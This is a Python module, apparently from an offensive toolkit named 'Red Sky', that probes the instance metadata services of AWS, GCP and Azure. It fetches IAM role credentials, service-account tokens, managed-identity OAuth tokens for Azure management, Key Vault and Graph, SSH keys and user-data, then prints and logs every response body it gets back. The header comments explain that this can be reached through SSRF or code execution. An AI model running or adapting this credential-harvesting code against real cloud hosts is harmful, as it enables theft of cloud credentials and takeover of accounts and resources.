# language: Python, file: Program/cloud/metadata.py, target: Red Sky cloud — instance metadata service
# Cloud instance metadata service (IMDS) probing. Each cloud's IMDS sits
# at a well-known address that any process on the instance can hit:
#
#   AWS   http://169.254.169.254/latest/meta-data/
#   GCP   http://metadata.google.internal/computeMetadata/v1/
#   Azure http://169.254.169.254/metadata/instance?api-version=...
#
# AWS IMDSv1 is headerless — anyone who can make an HTTP request from the
# instance (SSRF, code exec, a misconfigured proxy) can grab the instance
# role's temporary credentials. IMDSv2 requires a PUT to get a session token
# first; many instances still run v1 in parallel.
#
# GCP requires header `Metadata-Flavor: Google`. Azure requires header
# `Metadata: true`. Both are trivially spoofed — they exist to block naive
# SSRF, not a process on the box.

import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud"
MD_HITS = CLOUD_DIR / "metadata_hits.jsonl"


IMDS_PATHS = {
    "aws": [
        ("http://169.254.169.254/latest/meta-data/", {}),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
        ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", {}),
        ("http://169.254.169.254/latest/user-data", {}),
        ("http://169.254.169.254/latest/dynamic/instance-identity/document", {}),
    ],
    "gcp": [
        ("http://metadata.google.internal/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", {"Metadata-Flavor": "Google"}),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
        ("http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys", {"Metadata-Flavor": "Google"}),
        ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/", {"Metadata-Flavor": "Google"}),
    ],
    "azure": [
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", {"Metadata": "true"}),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net", {"Metadata": "true"}),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/", {"Metadata": "true"}),
    ],
}


def _get(url: str, headers: Dict[str, str], timeout: int = 4) -> Optional[str]:
    try:
        import requests
    except ImportError:
        print_err("requests not installed")
        return None
    try:
        r = requests.get(url, headers=headers, timeout=timeout)
        if r.status_code == 200:
            return r.text
        if r.status_code == 401 and "imdsv2" not in url.lower():
            return None
        return None
    except Exception:
        return None


def _put_imdsv2_token(timeout: int = 4) -> Optional[str]:
    """AWS IMDSv2: PUT /latest/api/token with a hop-limit header."""
    try:
        import requests
    except ImportError:
        return None
    try:
        r = requests.put(
            "http://169.254.169.254/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=timeout,
        )
        if r.status_code == 200:
            return r.text.strip()
        return None
    except Exception:
        return None


def _log(cloud: str, path: str, body: str) -> None:
    CLOUD_DIR.mkdir(parents=True, exist_ok=True)
    with MD_HITS.open("a") as f:
        f.write(json.dumps({
            "ts": int(time.time()), "cloud": cloud, "path": path, "body": body[:8192],
        }) + "\n")


def cmd_probe(cloud: str, out: str) -> int:
    if cloud not in IMDS_PATHS:
        print_err("unknown cloud: " + cloud)
        print_info("known: " + ", ".join(IMDS_PATHS.keys()))
        return 1

    CLOUD_DIR.mkdir(parents=True, exist_ok=True)
    print_info("cloud metadata probe")
    print_kv("cloud", cloud)
    print_kv("paths", len(IMDS_PATHS[cloud]))
    print()

    hits = []
    imdsv2_token = None
    if cloud == "aws":
        imdsv2_token = _put_imdsv2_token()
        if imdsv2_token:
            print_ok("IMDSv2 token acquired — instance allows v2 PUT")
            print_kv("token_prefix", imdsv2_token[:32] + "...")
        else:
            print_info("IMDSv2 token not available (or not AWS) — trying v1")

    for url, headers in IMDS_PATHS[cloud]:
        h = dict(headers)
        if imdsv2_token:
            h["X-aws-ec2-metadata-token"] = imdsv2_token
        body = _get(url, h)
        if body is None:
            print("  " + ASH + url + RESET + " (no)")
            continue
        print("  " + SCARLET + "HIT" + RESET + " " + url)
        snippet = body[:600].replace("\n", " / ")
        print("      " + BONE + snippet + RESET)
        hits.append({"url": url, "body": body})
        _log(cloud, url, body)

    print()
    print_kv("hits", len(hits))
    if out and hits:
        p = Path(out)
        p.write_text(json.dumps(hits, indent=2))
        print_kv("saved", p)
    return 0 if hits else 1


def cmd_chain() -> int:
    """Try aws → gcp → azure in order, first hit wins."""
    for cloud in ("aws", "gcp", "azure"):
        print_info("trying " + cloud)
        rc = cmd_probe(cloud, "")
        if rc == 0:
            print()
            print_ok(cloud + " is live")
            return 0
        print()
    print_err("no metadata service reachable")
    return 1


def run_cli(args):
    import argparse
    sub = args[0] if args else "chain"
    rest = args[1:] if args else []

    if sub in ("-h", "--help", "help"):
        print_info("redsky cloud metadata <sub-command>")
        print_info("")
        print_info("  probe --cloud aws|gcp|azure [--out FILE]")
        print_info("      hit the IMDS paths for one cloud, dump bodies")
        print_info("  chain")
        print_info("      try aws, gcp, azure in order — first hit wins")
        return 0

    if sub == "probe":
        p = argparse.ArgumentParser(prog="redsky cloud metadata probe", add_help=False)
        p.add_argument("--cloud", required=False, default="")
        p.add_argument("--out", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky cloud metadata probe --cloud aws [--out FILE]")
            return 2
        if not ns.cloud:
            print_err("--cloud required (aws|gcp|azure)")
            return 2
        return cmd_probe(ns.cloud, ns.out)

    if sub in ("chain", "all"):
        return cmd_chain()

    print_err("unknown metadata sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
